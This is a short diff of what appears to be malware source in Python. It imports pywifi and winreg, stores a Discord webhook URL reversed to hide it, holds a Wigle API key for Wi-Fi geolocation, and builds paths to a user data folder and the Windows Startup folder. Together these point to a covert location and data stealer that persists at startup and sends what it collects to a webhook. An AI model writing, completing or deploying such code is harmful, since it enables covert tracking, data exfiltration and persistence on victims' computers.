@@ -31,10 +31,12 @@ import winreg as wrg
 import pywifi
 import urllib
 
+
 webhookurl=""
-wifiencoding=""
+wifiencoding="utf-8"
+api_key = 'WIgle API'
+
 webhook = DiscordWebhook(url=webhookurl[::-1])#Set up webhook
-api_key = 'WigleAPIheader'
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
